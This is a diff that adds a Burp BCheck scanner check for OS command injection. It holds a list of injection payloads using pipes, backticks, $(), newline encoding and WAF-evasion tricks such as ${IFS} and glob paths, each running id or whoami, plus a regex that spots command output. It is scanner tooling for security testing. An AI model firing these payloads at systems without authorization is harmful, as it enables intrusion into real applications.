@@ -1,0 +1,33 @@
+metadata:
+    language: v2-beta
+    name: "OS Command Injection - Multi Vector with WAF Bypass"
+    description: "Tests for OS command injection using multiple shell metacharacters and obfuscation"
+    author: "BCheck Arsenal"
+    tags: "cmdi", "rce", "waf-bypass"
+
+given insertion point then
+    send payload:
+        replacing: "{insertion_point}"
+        following replacements:
+            - "|id"
+            - ";id"
+            - "`id`"
+            - "$(id)"
+            - "%0aid"
+            - ";%09id"
+            - ";i${IFS}d"
+            - ";{i,d}"
+            - ";/???/i?"
+            - ";$(printf '\x69\x64')"
+            - "|whoami"
+            - "&whoami"
+            - "||whoami"
+            - "&&whoami"
+
+    if {check.response} matches "(uid=|gid=|groups=|root|www-data|AUTHORITY\\SYSTEM)" then
+        report issue:
+            severity: high
+            confidence: certain
+            detail: "OS command injection detected. The application executes user-supplied input as system commands."
+            remediation: "Never pass user input to system commands. Use language-native APIs."
+    end if
